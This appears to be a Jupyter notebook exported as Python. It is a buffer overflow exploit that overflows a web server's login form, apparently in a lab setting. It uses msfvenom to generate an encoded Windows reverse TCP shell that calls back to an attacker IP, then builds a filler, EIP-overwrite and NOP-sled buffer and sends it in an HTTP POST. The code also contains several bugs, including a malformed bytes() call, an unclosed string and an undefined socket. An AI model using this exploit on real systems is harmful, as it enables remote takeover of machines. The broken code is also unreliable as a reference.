#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import socket
import string
import os
import subprocess
import re
import time

host         = '192.168.119.192'
lport        = '443'
target_host  = '192.168.192.10'
port         = 80
size         = 780
letter       = b'B'

hex_location = "830C0910"


# In[1]:


def header_maker(p):
    main_header="""POST /login HTTP/1.1\r
Host: {0}\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{0}/login\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {1}\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r\n\r\n""".format(len(p))
    main_header=bytes(target_host,main_header,'utf-8')
    main_header+=p
    
    return main_header


# In[ ]:


known_bad=[]  #append known bad from last script
known_bad_str=''.join(['\\x'+x for x in known_bad])



# In[ ]:


arguments='msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "{}"'.format(host,lport,known_bad_str).split()

shellcode= subprocess.check_output(arguments)

my_hex=re.findall('x..',str(shellcode,'utf-8'))


new_shellcode=bytes.fromhex(''.join([x[1:] for x in my_hex]))



# In[ ]:


null=subprocess.call('clear))
print('!!!Sending evil buffer...!!!')

filler= letter*size
eip=bytes.fromhex(hex_location)
offset=b'C'*4

nops = b"\x90" * 20

buffer_str=filler+eip+offset+nops+new_shellcode

payload = b"username="+buffer_str+b"&password=A"

header=header_maker(payload)
s.connect((target_host,port))
time.sleep(1)
s.send(header)
#print(header)
s.close()


# In[ ]:




